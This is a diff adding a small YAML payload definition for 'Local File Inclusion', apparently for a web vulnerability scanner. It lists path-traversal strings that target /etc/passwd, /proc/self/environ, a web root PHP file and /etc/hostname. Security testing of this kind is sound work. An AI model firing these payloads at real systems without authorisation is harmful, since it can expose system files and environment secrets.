@@ -1,0 +1,9 @@
+name: "Local File Inclusion"
+type: "lfi"
+severity: "high"
+payloads:
+  - "../../../../etc/passwd"
+  - "../../../etc/passwd"
+  - "/proc/self/environ"
+  - "../../../../var/www/html/index.php"
+  - "../../../../etc/hostname"
